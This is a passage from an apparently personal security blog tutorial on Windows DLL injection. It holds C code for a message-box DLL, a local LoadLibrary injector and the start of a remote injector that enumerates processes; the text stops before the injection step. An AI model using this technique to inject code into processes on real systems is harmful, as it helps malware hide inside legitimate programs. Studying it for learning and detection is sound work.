<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>An overview of DLL injection | Journal of Connar</title>
<meta name="keywords" content="Dll-Injection">
<meta name="description" content=" 
Intro
When I was learning about API Hashing, I had touched upon a topic named DLL Unlinking. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.">
<meta name="author" content="connar">
<link rel="canonical" href="http://localhost:1313/posts/dllinjection/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/dllinjection/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
                    <span>My Challenges</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      An overview of DLL injection
    </h1>
    <div class="post-meta">20 min&nbsp;·&nbsp;connar

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#intro" aria-label="Intro">Intro</a></li>
                <li>
                    <a href="#what-is-dll-injection" aria-label="What is DLL Injection">What is DLL Injection</a></li>
                <li>
                    <a href="#overview-of-how-it-works" aria-label="Overview of how it works">Overview of how it works</a></li>
                <li>
                    <a href="#local-vs-remote-dll-injection" aria-label="Local vs Remote DLL Injection">Local vs Remote DLL Injection</a></li>
                <li>
                    <a href="#making-a-simple-dll" aria-label="Making a simple DLL">Making a simple DLL</a></li>
                <li>
                    <a href="#local-dll-injection" aria-label="Local DLL Injection">Local DLL Injection</a></li>
                <li>
                    <a href="#remote-dll-injections" aria-label="Remote DLL Injections">Remote DLL Injections</a><ul>
                        
                <li>
                    <a href="#remote-dll-injection-poc" aria-label="Remote DLL Injection PoC">Remote DLL Injection PoC</a><ul>
                        
                <li>
                    <a href="#getremoteprocesshandle---getting-a-handle-to-the-target-process" aria-label="GetRemoteProcessHandle - Getting a handle to the target process">GetRemoteProcessHandle - Getting a handle to the target process</a><ul>
                        
                <li>
                    <a href="#process-enumeration---step-1" aria-label="Process enumeration - [Step 1]">Process enumeration - [Step 1]</a></li>
                <li>
                    <a href="#process-enumeration---step-2" aria-label="Process enumeration - [Step 2]">Process enumeration - [Step 2]</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#process-enumeration---step-3" aria-label="Process enumeration - [Step 3]">Process enumeration - [Step 3]</a><ul>
                        
                <li>
                    <a href="#injectdllremoteprocess---injecting-the-dll-to-the-remote-process" aria-label="InjectDllRemoteProcess - Injecting the DLL to the remote process">InjectDllRemoteProcess - Injecting the DLL to the remote process</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><style>
	fieldset {
		background: url('/img/test.gif') no-repeat center center;
		background-size: cover;
		border: 1px solid #ccc;
		padding: 10px;
		position: relative;
		z-index: 2;
		color: #dcdcdc;
		font-weight: 500;
	}
</style> 
<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
<p>When I was learning about API Hashing, I had touched upon a topic named <strong>DLL Unlinking</strong>. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.</p>
<p>Before I could proceed in experimenting with this topic though, I had to first learn how to do DLL Injection since DLL Unlinking is related to that.</p>
<p>So basically this post will be just that: <strong>Learning DLL Injection</strong>!</p>
<h2 id="what-is-dll-injection">What is DLL Injection<a hidden class="anchor" aria-hidden="true" href="#what-is-dll-injection">#</a></h2>
<p>DLL Injection is a technique that exists for a while now and is used by malware, where a malicious process injects a DLL existing on the disk into a target (and legitimate) process.</p>
<p>Basically, processes use DLL&rsquo;s for their functionality, so the idea is to inject an &ldquo;extra&rdquo; DLL (which is malicious and definitely not needed by the process) into that legitimate process to try and go under the radar.</p>
<p>There are many DLL injection techniques such as:</p>
<ul>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection">Reflective DLL Injection</a></li>
<li><a href="https://dmcxblue.gitbook.io/red-team-notes/persistence/dll-search-order-hijacking">DLL Search Order Hijack</a></li>
</ul>
<p>I was just starting to learn about the simply DLL Injection technique so the examples shown will be about that.</p>
<h2 id="overview-of-how-it-works">Overview of how it works<a hidden class="anchor" aria-hidden="true" href="#overview-of-how-it-works">#</a></h2>
<p>The idea is we have a <strong>target process</strong> that we would like to inject a dll into:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection1.png" alt=""  />
</p>
<p>Then we have an <strong>injector process</strong> that we initiate the injection procedure (basically the process that will inject the DLL into another process):</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection2.png" alt=""  />
</p>
<p>The first thing to do is to allocate memory to the target process address space and write the path of the dll into the target address space process.</p>
<p>The reason for that is that we are going to use the <code>CreateRemoteThread</code> function to run the <code>LoadLibrary</code> api and <code>LoadLibrary</code> needs the path to the dll, so we have to put the path in the target process were the <strong>remote thread</strong> will run.</p>
<p>Then we can create the <strong>remote thread</strong> in the <strong>target process</strong>, our thread will be pointed to the <code>LoadLibrary</code> function. It&rsquo;s going to call the <code>LoadLibrary</code> function using the dll path we wrote before and that would force the dll to be loaded into a <strong>target process</strong>:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection3.png" alt=""  />
</p>
<p>Then the injector process can simply go away as we dont need it anymore, and the dll will simply be there:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection4.png" alt=""  />
</p>
<h2 id="local-vs-remote-dll-injection">Local vs Remote DLL Injection<a hidden class="anchor" aria-hidden="true" href="#local-vs-remote-dll-injection">#</a></h2>
<p>I will first go through a simple <strong>local DLL injection</strong> to get a bit comfortable around the concept of the loaded path of the DLL that will be loaded into memory. When I say <strong>local DLL injection</strong>, I mean:</p>
<ul>
<li>[Step 1]: Creating a DLL.</li>
<li>[Step 2]: Creating an executable.</li>
<li>[Step 3]: Running the executable and loading the DLL <strong>into that running executable</strong> we created on Step 2.</li>
</ul>
<p>After we are comfortable around that, we will see how to inject the DLL not to a local process but to a remote one (<strong>remote DLL Injection</strong>). When I say <strong>remote DLL Injection</strong>, I mean:</p>
<ul>
<li>[Step 1]: Creating a DLL.</li>
<li>[Step 2]: Creating an executable.</li>
<li>[Step 3]: Running the executable and loading the DLL <strong>into some other process</strong>, like notepad.exe for example.</li>
</ul>
<h2 id="making-a-simple-dll">Making a simple DLL<a hidden class="anchor" aria-hidden="true" href="#making-a-simple-dll">#</a></h2>
<p>The DLL we will be injecting is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;Windows.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;stdio.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#a6e22e">MsgBoxPayload</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">MessageBoxA</span>(NULL, <span style="color:#e6db74">&#34;DLL Injected successfully:D&#34;</span>, <span style="color:#e6db74">&#34;Wow !&#34;</span>, MB_OK <span style="color:#f92672">|</span> MB_ICONINFORMATION);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (dwReason) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH: {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">MsgBoxPayload</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This will simply call the MsgBoxPayload() function once the DLL is attached to a process (<code>DLL_PROCESS_ATTACH</code>).</p>
<h2 id="local-dll-injection">Local DLL Injection<a hidden class="anchor" aria-hidden="true" href="#local-dll-injection">#</a></h2>
<p>To do a local DLL Injection, you simply just load the DLL into the running process created by your executable. To load the DLL, you just need to use <code>LoadLibrary</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Check that an argument was passed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Missing Argument; Dll Payload To Run </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Injecting </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> To The Local Process Of Pid: %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>], <span style="color:#a6e22e">GetCurrentProcessId</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get full path of the provided DLL
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">char</span> fullPath[MAX_PATH];
</span></span><span style="display:flex;"><span>	DWORD pathLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFullPathNameA</span>(argv[<span style="color:#ae81ff">1</span>], MAX_PATH, fullPath, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pathLen <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> pathLen <span style="color:#f92672">&gt;</span> MAX_PATH) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Could not determine the full path for %s. Error: %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>], <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Load the DLL with LoadLibraryA
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Loading Dll... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LoadLibraryA</span>(fullPath) <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] LoadLibraryA Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] DONE ! </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; To Quit ... &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now that we have our executable and the DLL ready for injection, let&rsquo;s open Process Hacker and then proceed to run our injector:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection5.png" alt=""  />
</p>
<p>And we see that indeed our DLL - that is definitely not needed for the process created by our executable - is loaded in the Modules this process uses.</p>
<p>Okay cool, but it would be really nice if we could use our executable to load the DLL not to the process created by our exe, but to a totally different process. <strong>Here comes the remote DLL Injection</strong>, so let&rsquo;s see how to do that!</p>
<h2 id="remote-dll-injections">Remote DLL Injections<a hidden class="anchor" aria-hidden="true" href="#remote-dll-injections">#</a></h2>
<p>In the <strong>remote DLL Injection</strong>, we inject a DLL into a remote process. In order to do that though, we need the PID of the target process.<br>
Also, the target process we want to inject our DLL into might not be even running, so the first step in injecting DLL&rsquo;s in remote processes is to first enumerate the running processes on the system.</p>
<p>As always, I will start by writting the code and explain each part as we develop it further.</p>
<h3 id="remote-dll-injection-poc">Remote DLL Injection PoC<a hidden class="anchor" aria-hidden="true" href="#remote-dll-injection-poc">#</a></h3>
<p>In the remote DLL Injection there is a lot more going on, but nothing too extreme. The code starts like the local DLL Injection where we need to get arguments from the user, specifically the dll we want to inject and the name of the process we want to inject our DLL into:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Usage: dll_injection.exe &lt;dll_path&gt; &lt;target_process&gt; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> dllPath <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> targetProcessName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[#] Press &lt;Enter&gt; to exit...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After we provide our DLL name and the target process name, we make some additional checks and convertions. Specifically:</p>
<ul>
<li>We find the full path of the DLL.</li>
<li>We convert the target process name and the full DLL path to wide char.
<ul>
<li>The reason we convert to wide char is because the <code>GetFullPathNameA</code> will return an <code>ANSI string</code>. Later we will pass that string to a method called <code>InjectDllRemoteProcess</code> which will work with <code>LPWSTR</code>, so a proper convertion to <code>wchar_t</code> array is needed in order to avoid missing null terminations or wrong encoding.</li>
</ul>
</li>
</ul>
<p>So the code is updated with the following part:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert target process name to wide characters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>WCHAR targetProcess[MAX_PATH];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MultiByteToWideChar</span>(CP_ACP, <span style="color:#ae81ff">0</span>, targetProcessName, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, targetProcess, MAX_PATH);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] DLL to inject: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, dllPath);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Target process: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, targetProcess);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Get the absolute path of the DLL.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> fullPath[MAX_PATH];
</span></span><span style="display:flex;"><span>DWORD pathLen <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFullPathNameA</span>(dllPath, MAX_PATH, fullPath, NULL);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pathLen <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> pathLen <span style="color:#f92672">&gt;</span> MAX_PATH) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Could not determine full path for %s. Error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dllPath, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Full DLL path resolved to: </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span>, fullPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert DLL path to wide characters.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>WCHAR wideFullPath[MAX_PATH];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MultiByteToWideChar</span>(CP_ACP, <span style="color:#ae81ff">0</span>, fullPath, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, wideFullPath, MAX_PATH);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>After we are done with our convertions, it is time to get a handle for the target process. Handle is a way to communicate with a resource. For example, when you open a file in python, you basically get a handle to that file. Without getting a handle we won&rsquo;t be able to make any other progress:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>DWORD processId;
</span></span><span style="display:flex;"><span>HANDLE hProcess;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetRemoteProcessHandle</span>(targetProcess, <span style="color:#f92672">&amp;</span>processId, <span style="color:#f92672">&amp;</span>hProcess)) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Failed to find or access target process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetProcess);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%S</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> found with PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetProcess, processId);
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>But how do we actually get a handle to the target process? Do we know if the process is even running on the victim&rsquo;s machine? And how do we find among all the running processes the one we are interested in?</p>
<p>Answers to all these questions exist inside the GetRemoteProcessHandle function, so let&rsquo;s continue from there.</p>
<h4 id="getremoteprocesshandle---getting-a-handle-to-the-target-process">GetRemoteProcessHandle - Getting a handle to the target process<a hidden class="anchor" aria-hidden="true" href="#getremoteprocesshandle---getting-a-handle-to-the-target-process">#</a></h4>
<p>The goal of our <code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)</code> is to find out if our target process exist, and if that is the case to return us a handle to that process along with its PID. So we must pass as parameters:</p>
<ul>
<li>the target process name (the full path we converted earlier).</li>
<li>the pointer to the processId which will be returned to us - if found.</li>
<li>the pointer of the handle we will get of the process - if found.</li>
</ul>
<p>The way this method works is by taking a snapshop of all the currently running processes of the machine with a function called <code>CreateToolhelp32Snapshot</code> and then just enumerating each one of them, comparing our target process name to the current one in the enumeration until it finds a match (or until the loop ends).</p>
<p>The part of the code that takes the snapshot is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSnapShot <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Capture a snapshot of all running processes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>hSnapShot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, NULL);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (hSnapShot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] CreateToolhelp32Snapshot Failed With Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In case you are wondering how to find the correct parameter to pass in <code>CreateToolhelp32Snapshot</code> like <code>TH32CS_SNAPPROCESS</code>, you always must revise microsoft documentation:</p>
<p><img loading="lazy" src="/posts/dllinjection/dllinjection6.png" alt=""  />
</p>
<p>Microsoft docs are so kind they let us know that in order to enumerate processes, we should see <code>Process32First</code>. So let&rsquo;s continue with the utilization of this function and explain how we use it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Capture a snapshot of all running processes.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>hSnapShot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, NULL);
